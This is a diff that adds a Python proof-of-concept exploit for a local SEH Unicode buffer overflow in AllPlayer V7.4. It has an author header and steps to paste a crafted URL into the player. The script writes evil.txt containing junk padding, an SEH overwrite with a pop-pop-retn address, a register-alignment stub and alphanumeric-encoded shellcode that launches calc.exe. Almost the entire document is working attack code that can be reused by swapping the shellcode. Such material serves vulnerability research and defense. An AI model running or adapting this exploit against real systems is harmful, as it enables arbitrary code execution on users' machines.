@@ -1,0 +1,59 @@
+#!/usr/bin/python -w
+
+#
+# Exploit Author: Chris Au
+# Exploit Title:  AllPlayer V7.4 - Local Buffer Overflow (SEH Unicode)
+# Date: 07-04-2019
+# Vulnerable Software: AllPlayer V7.4
+# Vendor Homepage: https://www.allplayer.org/
+# Version: 7.4
+# Software Link: http://allplayer.org/Download/ALLPlayerEN.exe
+# Tested Windows Windows 7 SP1 x86
+#
+#
+# PoC
+# 1. generate evil.txt, copy contents to clipboard
+# 2. open AllPlayer
+# 3. select "Open video or audio file", click "Open URL"
+# 4. paste contents from clipboard
+# 5. select OK
+# 6. calc.exe
+#
+
+filename="evil.txt"
+header = "http://"
+junk = "\xcc" * 301
+nseh = "\x90\x45"
+seh = "\x7a\x74" #pop pop retn
+valign = (
+"\x55" #push ebp
+"\x45" #align
+"\x58" #pop eax
+"\x45" #align
+"\x05\x20\x11" #add eax,11002000
+"\x45" #align
+"\x2d\x18\x11" #sub eax,11001900
+"\x45" #align
+"\x50" #push eax
+"\x45" #align
+"\xc3" #retn
+)
+#nop to shell
+nop = "\xcc" * 115
+shellcode = (
+"PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAI"
+"AQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIA"
+"JQYAZBABABABABkMAGB9u4JBkLK8qrM0ypyps0e9xeP1Y0RD4K"
+"npnPrkPRLLbkb2N42kt2lhlOegmzkvMaYodlMl0aqlKRnLo0Uq"
+"foLMzai7zBl2nrOgTKnrJptKNjoLBkpLjqahISQ8KQ8QpQRkaI"
+"kpKQYCbkMyzxHcnZq9bkNTTK9q9FMaYofLVa8OLMjaI7p8GpRU"
+"9flCamXxmksMo4d5JD1HrknxMTYq8Sc6RkJl0KtKnxKlkQFs4K"
+"zdtKKQJ0RiQ4NDLdOkOkC1pYOjOakOyPQOqOpZ4KN2zKTMaM0j"
+"kQbmu55bKP9pM0b0C8014KROQwkOIEek8pTuTbPVQXcvTU7MeM"
+"iohUOLm6qlyze09k7p0u9ugKa7mCPrbOqZ9pOcYoHURCPa0l0c"
+"Lnc51hOuipAA")
+fill = "\x45" * 5000
+buffer = header + junk + nseh + seh + valign + nop + shellcode + fill
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
